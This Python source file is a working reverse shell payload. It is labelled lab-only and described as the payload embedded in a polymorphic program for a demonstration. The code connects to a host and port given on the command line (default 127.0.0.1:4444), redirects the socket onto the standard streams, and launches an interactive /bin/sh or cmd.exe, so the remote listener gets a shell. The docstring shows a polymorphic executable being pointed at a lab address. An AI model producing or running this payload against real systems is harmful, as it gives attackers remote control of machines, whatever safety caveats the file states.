#!/usr/bin/env python3
"""Lab-only reverse shell payload for the Hidden-Bytes demonstration.

This is the payload embedded in the polymorphic program. It connects back to
a listener that the operator controls, then hands the connection to a local
shell.

Safety rules for this file:

- The address and port are given on the command line and default to
  127.0.0.1, so it can only reach a listener on the same machine unless the
  operator points it somewhere else on purpose.
- It is meant for an isolated lab VM with a host-only network. Never point
  it at a machine you do not own or have written permission to test.
- There is no persistence, no privilege escalation, no lateral movement and
  no evasion. It opens one TCP connection and relays a shell over it.

The polymorphic generator embeds this file and executes it, forwarding the
generated program's own arguments:

    ./polymorphic.exe --host 192.168.56.101 --port 4444
"""

import argparse
import os
import socket
import subprocess
import sys


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="reverse_shell_payload",
        description="Connect back to a lab listener and relay a shell.",
    )
    parser.add_argument(
        "--host",
        default="127.0.0.1",
        help="address of the lab listener (default: 127.0.0.1)",
    )
    parser.add_argument(
        "--port",
        type=int,
        default=4444,
        help="port of the lab listener (default: 4444)",
    )
    return parser


def main() -> int:
    args = build_parser().parse_args()

    if os.name == "nt":
        shell = ["cmd.exe"]
    else:
        shell = ["/bin/sh", "-i"]

    print(
        f"[INFO] Reverse shell initialized. Connecting to {args.host}:{args.port}..."
    )

    try:
        connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connection.connect((args.host, args.port))
    except OSError as exc:
        print(
            f"[ERROR] Could not connect to {args.host}:{args.port}: {exc}",
            file=sys.stderr,
        )
        return 1

    print("[INFO] Connected. Starting shell.")

    # Hand the socket to the shell as stdin, stdout and stderr.
    os.dup2(connection.fileno(), 0)
    os.dup2(connection.fileno(), 1)
    os.dup2(connection.fileno(), 2)

    subprocess.call(shell)  # noqa: S602 - lab payload, operator-supplied shell

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
